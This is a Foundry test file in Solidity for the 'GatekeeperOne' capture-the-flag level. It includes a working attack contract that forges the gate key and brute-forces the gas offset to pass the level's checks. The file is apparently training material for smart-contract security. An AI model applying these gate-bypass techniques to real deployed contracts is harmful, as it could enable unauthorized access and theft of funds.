pragma solidity ^0.8.0;

import "src/levels/GatekeeperOne/GatekeeperOneFactory.sol";
import "src/levels/GatekeeperOne/GatekeeperOne.sol";
import "forge-std/Test.sol";

contract GatekeeperOneAttackTest is Test {
    address public dummyPlayerAddress = 0x30d2554d48037F642f095F24098319481A6D6642;
    GatekeeperOneFactory public factory;
    GatekeeperOne public instance;

    function setUp() public {
        factory = new GatekeeperOneFactory();
        instance = GatekeeperOne(payable(factory.createInstance(dummyPlayerAddress)));
    }

    function test_ShouldNotBeImmediatelySolvable() public {
        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), false);
    }

    function test_ShouldAllowThePlayerToSolveTheLevel() public {
        vm.startPrank(dummyPlayerAddress, dummyPlayerAddress);
        
        GatekeeperOneAttack gatekeeperOneAttack = new GatekeeperOneAttack(instance);
        gatekeeperOneAttack.attack();

        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), true);
    }
}

contract GatekeeperOneAttack {
    GatekeeperOne public gatekeeperOne;

    constructor(GatekeeperOne  _gatekeeperOne) payable {
        gatekeeperOne = _gatekeeperOne;
    }

    function attack() public {
        bytes8 gateKey = bytes8(abi.encodePacked(uint32(1), uint16(0), uint16(uint160(msg.sender))));
        bytes memory data = abi.encodeCall(GatekeeperOne.enter, gateKey);
        for (uint256 i = 200; i < 450; i++) {
            (bool success ,) = address(gatekeeperOne).call{gas: i + 8191 * 4}(data);
            if (success) {
                break;
            }
        }
    }
}
